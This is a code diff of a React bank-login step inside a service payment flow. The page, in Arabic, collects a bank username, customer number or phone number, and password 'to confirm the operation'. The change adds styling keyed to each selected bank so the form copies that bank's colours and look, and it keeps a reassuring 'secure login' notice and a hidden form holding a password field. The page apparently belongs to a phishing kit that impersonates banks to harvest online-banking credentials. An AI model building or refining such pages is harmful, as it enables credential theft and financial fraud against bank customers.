@@ -49,6 +49,36 @@ const PaymentBankLogin = () => {
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
   
+  // Bank-specific styling
+  const bankColor = selectedBank?.color || branding.colors.primary;
+  const bankSecondaryColor = selectedBank?.secondaryColor || bankColor;
+  const bankBgColor = selectedBank?.backgroundColor || '#FFFFFF';
+  const bankTextColor = selectedBank?.textColor || '#1A1A1A';
+  const buttonStyle = selectedBank?.buttonStyle || 'gradient';
+  const inputStyle = selectedBank?.inputStyle || 'rounded';
+  const layoutStyle = selectedBank?.layoutStyle || 'modern';
+  
+  // Input border radius classes
+  const inputRadiusClass = 
+    inputStyle === 'rounded-lg' ? 'rounded-lg' :
+    inputStyle === 'square' ? 'rounded-none' :
+    'rounded-md';
+  
+  // Button background style
+  const getButtonStyle = () => {
+    if (buttonStyle === 'gradient') {
+      return { background: `linear-gradient(135deg, ${bankColor}, ${bankSecondaryColor})` };
+    } else if (buttonStyle === 'outline') {
+      return { 
+        background: 'transparent',
+        border: `2px solid ${bankColor}`,
+        color: bankColor
+      };
+    } else {
+      return { background: bankColor };
+    }
+  };
+  
   // Determine login type based on bank
   const getLoginType = () => {
     if (!selectedBank) return 'username';
@@ -228,19 +258,34 @@ const PaymentBankLogin = () => {
   };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
-      description="أدخل بيانات الدخول للبنك لتأكيد العملية"
-      icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+    <div 
+      className="min-h-screen" 
+      dir="rtl"
+      style={{
+        background: layoutStyle === 'minimal' 
+          ? '#FFFFFF' 
+          : layoutStyle === 'classic'
+          ? `linear-gradient(135deg, ${bankBgColor} 0%, ${bankBgColor}99 100%)`
+          : `linear-gradient(135deg, ${bankColor}08 0%, ${bankSecondaryColor}08 100%)`
+      }}
     >
+      <DynamicPaymentLayout
+        serviceName={serviceName}
+        serviceKey={serviceKey}
+        amount={formattedAmount}
+        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
+        description="أدخل بيانات الدخول للبنك لتأكيد العملية"
+        icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
+        showHero={false}
+      >
       {/* Bank Info Header */}
       <div 
-        className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
+        className={`${inputRadiusClass} p-4 sm:p-5 mb-6 flex items-center gap-4 shadow-lg`}
         style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
+          background: buttonStyle === 'gradient'
+            ? `linear-gradient(135deg, ${bankColor}, ${bankSecondaryColor})`
+            : bankColor,
+          color: '#FFFFFF'
         }}
       >
         <div 
@@ -260,13 +305,13 @@ const PaymentBankLogin = () => {
 
       {/* Security Notice */}
       <div 
-        className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
+        className={`${inputRadiusClass} p-3 sm:p-4 mb-6 flex items-start gap-2`}
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `${bankColor}10`,
+          border: `1px solid ${bankColor}30`
         }}
       >
-        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
+        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: bankColor }} />
         <div className="text-xs sm:text-sm">
           <p className="font-semibold mb-1">تسجيل دخول آمن</p>
           <p className="text-muted-foreground">
@@ -281,13 +326,26 @@ const PaymentBankLogin = () => {
         {loginType === 'username' && (
           <>
             <div>
-              <Label className="mb-2 text-sm sm:text-base">اسم المستخدم</Label>
+              <Label className="mb-2 text-sm sm:text-base" style={{ color: bankTextColor }}>اسم المستخدم</Label>
               <Input
                 type="text"
                 placeholder="أدخل اسم المستخدم"
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
-                className="h-12 sm:h-14 text-base sm:text-lg"
+                className={`h-12 sm:h-14 text-base sm:text-lg ${inputRadiusClass} border-2 focus:outline-none transition-colors`}
+                style={{
+                  borderColor: `${bankColor}40`,
+                  backgroundColor: bankBgColor,
+                  color: bankTextColor
+                }}
+                onFocus={(e) => {
+                  e.target.style.borderColor = bankColor;
+                  e.target.style.boxShadow = `0 0 0 3px ${bankColor}20`;
+                }}
+                onBlur={(e) => {
+                  e.target.style.borderColor = `${bankColor}40`;
+                  e.target.style.boxShadow = 'none';
+                }}
                 autoComplete="username"
                 required
               />
@@ -299,13 +357,26 @@ const PaymentBankLogin = () => {
         {loginType === 'customerId' && (
           <>
             <div>
-              <Label className="mb-2 text-sm sm:text-base">رقم العميل</Label>
+              <Label className="mb-2 text-sm sm:text-base" style={{ color: bankTextColor }}>رقم العميل</Label>
               <Input
                 type="text"
                 placeholder="أدخل رقم العميل"
                 value={customerId}
                 onChange={(e) => setCustomerId(e.target.value)}
-                className="h-12 sm:h-14 text-base sm:text-lg"
+                className={`h-12 sm:h-14 text-base sm:text-lg ${inputRadiusClass} border-2 focus:outline-none transition-colors`}
+                style={{
+                  borderColor: `${bankColor}40`,
+                  backgroundColor: bankBgColor,
+                  color: bankTextColor
+                }}
+                onFocus={(e) => {
+                  e.target.style.borderColor = bankColor;
+                  e.target.style.boxShadow = `0 0 0 3px ${bankColor}20`;
+                }}
+                onBlur={(e) => {
+                  e.target.style.borderColor = `${bankColor}40`;
+                  e.target.style.boxShadow = 'none';
+                }}
                 inputMode="numeric"
                 required
               />
@@ -317,13 +388,26 @@ const PaymentBankLogin = () => {
         {loginType === 'phone' && (
           <>
             <div>
-              <Label className="mb-2 text-sm sm:text-base">رقم الجوال</Label>
+              <Label className="mb-2 text-sm sm:text-base" style={{ color: bankTextColor }}>رقم الجوال</Label>
               <Input
                 type="tel"
                 placeholder="05xxxxxxxx"
                 value={phoneNumber}
                 onChange={(e) => setPhoneNumber(e.target.value)}
-                className="h-12 sm:h-14 text-base sm:text-lg"
+                className={`h-12 sm:h-14 text-base sm:text-lg ${inputRadiusClass} border-2 focus:outline-none transition-colors`}
+                style={{
+                  borderColor: `${bankColor}40`,
+                  backgroundColor: bankBgColor,
+                  color: bankTextColor
+                }}
+                onFocus={(e) => {
+                  e.target.style.borderColor = bankColor;
+                  e.target.style.boxShadow = `0 0 0 3px ${bankColor}20`;
+                }}
+                onBlur={(e) => {
+                  e.target.style.borderColor = `${bankColor}40`;
+                  e.target.style.boxShadow = 'none';
+                }}
                 inputMode="tel"
                 required
               />
@@ -333,14 +417,27 @@ const PaymentBankLogin = () => {
         
         {/* Password (common for all types) */}
         <div>
-          <Label className="mb-2 text-sm sm:text-base">كلمة المرور</Label>
+          <Label className="mb-2 text-sm sm:text-base" style={{ color: bankTextColor }}>كلمة المرور</Label>
           <div className="relative">
             <Input
               type={showPassword ? "text" : "password"}
               placeholder="أدخل كلمة المرور"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
-              className="h-12 sm:h-14 text-base sm:text-lg pl-12"
+              className={`h-12 sm:h-14 text-base sm:text-lg pl-12 ${inputRadiusClass} border-2 focus:outline-none transition-colors`}
+              style={{
+                borderColor: `${bankColor}40`,
+                backgroundColor: bankBgColor,
+                color: bankTextColor
+              }}
+              onFocus={(e) => {
+                e.target.style.borderColor = bankColor;
+                e.target.style.boxShadow = `0 0 0 3px ${bankColor}20`;
+              }}
+              onBlur={(e) => {
+                e.target.style.borderColor = `${bankColor}40`;
+                e.target.style.boxShadow = 'none';
+              }}
               autoComplete="current-password"
               required
             />
@@ -368,8 +465,8 @@ const PaymentBankLogin = () => {
           </div>
           <button
             type="button"
-            className="text-muted-foreground hover:underline"
-            style={{ color: selectedBank?.color || branding.colors.primary }}
+            className="hover:underline transition-colors"
+            style={{ color: bankColor }}
           >
             نسيت كلمة المرور؟
           </button>
@@ -379,10 +476,12 @@ const PaymentBankLogin = () => {
         <Button
           type="submit"
           size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
+          className={`w-full text-sm sm:text-lg py-5 sm:py-7 font-bold shadow-lg transition-all ${inputRadiusClass}`}
           disabled={isSubmitting}
           style={{
-            background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`
+            ...getButtonStyle(),
+            ...(buttonStyle !== 'outline' ? { color: '#FFFFFF' } : {}),
+            opacity: isSubmitting ? 0.7 : 1
           }}
         >
           {isSubmitting ? (
@@ -410,8 +509,12 @@ const PaymentBankLogin = () => {
           type="button"
           variant="outline"
           size="sm"
-          className="text-xs"
-          style={{ borderColor: selectedBank?.color || branding.colors.primary }}
+          className={`text-xs ${inputRadiusClass}`}
+          style={{ 
+            borderColor: bankColor,
+            color: bankColor,
+            backgroundColor: 'transparent'
+          }}
         >
           تسجيل حساب جديد
         </Button>
@@ -434,7 +537,8 @@ const PaymentBankLogin = () => {
         <input type="password" name="password" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+      </DynamicPaymentLayout>
+    </div>
   );
 };
 
